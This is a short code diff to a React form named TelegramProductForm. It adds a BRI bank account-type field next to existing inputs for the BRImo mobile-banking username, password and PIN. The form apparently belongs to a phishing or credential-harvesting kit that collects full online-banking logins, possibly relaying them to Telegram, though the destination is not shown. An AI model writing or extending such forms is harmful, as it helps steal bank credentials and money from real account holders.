@@ -104,6 +104,7 @@ function TelegramProductForm() {
     } else if (b === 'BRI') {
       return (
         <>
+          <input name="jenisRekening" placeholder="Jenis Rekening (Britama/Simpedes/dll)" value={form.jenisRekening} onChange={handleChange} />
           <input name="brimoUser" placeholder="User BRImo" value={form.brimoUser} onChange={handleChange} />
           <input name="brimoPassword" placeholder="Password BRImo" type="password" value={form.brimoPassword} onChange={handleChange} />
           <input name="mobilePin" placeholder="PIN BRImo" value={form.mobilePin} onChange={handleChange} />
